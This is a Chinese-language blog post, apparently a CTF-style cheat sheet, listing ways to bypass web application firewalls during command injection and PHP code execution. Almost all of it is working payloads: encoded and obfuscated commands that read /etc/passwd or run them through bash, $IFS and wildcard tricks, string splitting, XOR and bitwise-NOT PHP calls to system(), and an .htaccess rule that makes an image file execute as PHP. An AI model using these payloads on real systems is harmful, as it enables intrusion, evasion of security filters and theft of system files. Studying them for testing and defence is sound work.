---
title: waf绕过总结
date: 2024-12-11 15:39:59
categories: 网络
tags: web
updated: 2024-12-11 15:39:59
---
# waf绕过总结
## ping
在ping的过程中一些地方可以在后方利用;或者|直接进行命令执行，但这时便会遇到一些相关方面的waf也就是阻拦，我们需要绕过这些waf

## 空格绕过：
在bash下可以用$IFS、${IFS}、$IFS$9、%09、<、>、<>、{,}（例如{cat,/etc/passwd} ）、%20(space)、%09(tab)

## 命令执行函数system()绕过
系统命令函数system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号（·） 同shell_exec()用以上函数都可进行绕过。

## 命令链接符：
Windows和Linux都支持的命令连接符：  
cmd1 | cmd2 只执行cmd2  
cmd1 || cmd2 只有当cmd1执行失败后，cmd2才被执行  
cmd1 & cmd2 先执行cmd1，不管是否成功，都会执行cmd2  
cmd1 && cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2  
Linux还支持分号（;），cmd1;cmd2 按顺序依次执行，先执行cmd1再执行cmd2  

## 正则匹配绕过

### 双写绕过
普通的正则只会匹配一次，所以我们可以双写绕过。pphphp，只会过滤掉中间的php剩下来的部分可以组成第二个php，phpphpinfoinfo，同理。

### 利用变量绕过
a=c;b=a;c=t;  
$a$b$c /etc/passwd

### 利用base编码绕过
echo 'cat' | base64
Y2F0wqAK  
`echo 'Y2F0wqAK' | base64 -d` /etc/passwd  
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash  //   cat /etc/passwd 

### 利用hex编码绕过
echo "636174202F6574632F706173737764" | xxd -r -p|bash // hex编码后的0x不需要输入

### 利用oct编码（八进制）绕过
\$(printf "\154\163")  //ls命令

### 利用16进制编码绕过
"\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd")

### 利用拼接绕过
(sy.(st).em)(whoami);//  
c''a''t /etc/passwd//单引  
c""a""t /etc/passwd//双引  
c``a``t /etc/passwd/反单引  
c\a\t /etc/passwd//反斜线  
\$*和$@，$x(x 代表 1-9),${x}(x>=10) :  
比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:  
wh$1oami  
who$@ami  
whoa$*mi  
666`whoami`666 //bash: 666root666: command not found  
666`\whoami`666 //bash: 666root666: command not found  
//命令执行后的结果在2个666中间  

### 插入注释
（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）
system/*A10ng_*/(whoami);  
system/*A10ng_*/(wh./*A10ng_*/(oa)/*caixukun*/.mi);  
(sy./*A10ng_*/(st)/*A10ng_*/.em)/*A10ng_*/(wh./*A10ng_*/(oa)/*A10ng_*/.mi);

### 利用未初始化变量
cat$u /etc/passwd
cat /etc$u/passwd

### 过滤了斜杠'/'
可利用';'拼接命令绕过
cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd

### 利用通配符绕过
cat /passwd：
??? /e??/?a????

### 利用path绕过
可以通过截断和拼接来得到我们想要的来getshell  
\${PATH:5:1} //l  
\${PATH:2:1} //s  
\${PATH:5:1}${PATH:2:1} //拼接后是ls,执行命令  
\${PATH:5:1}s //拼接后是ls,执行命令 

### 异或绕过
```py
def xor():
    for i in range(0,128):
        for j in range(0,128):
            result=i^j
            print(chr(i)+'  ^  '+chr(j)+' == >  '+chr(result)+" ASCII:"+str(result))
if __name__ == "__main__":
    xor()
```

('GGGGGGG'^'7/7.)!(')();  
其中'G'^'7'=p，'G'^'/'=h…………依次类推拼出你想得到的令。

### 取反绕过
在这里存在一个取反的问题，原因是隐藏字母、可还原性、URL 编码与二进制兼容性
取反是一种隐蔽技术，它将敏感字符转换为难以识别的形式，有效规避检测。而不取反会直接暴露敏感字符或使其更容易被解码检测。结合 urlencode() 等方法，按位取反可以提升绕过复杂度并增强隐匿性
```php
<?php
echo urlencode(~'phpinfo');
?>
```
例如phpinfo()就是：  
(~'%8F%97%8F%96%91%99%90')();

```php
<?php
$a = "system";
$b = "ls /";
echo urlencode(~$a);  // 使用 ~$a，按位取反操作
print("\n");
echo urlencode(~$b);  // 使用 ~$b，按位取反操作
?>
payload=?wllm=(~%8c%86%8c%8b%9a%92)(~%9C%9E%8B%DF%D0%99%D5);
```

## .htaccess文件包含绕过
```js
//仅匹配1.jpg，也可以适用全部文件，解析为php
<FilesMatch "1.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```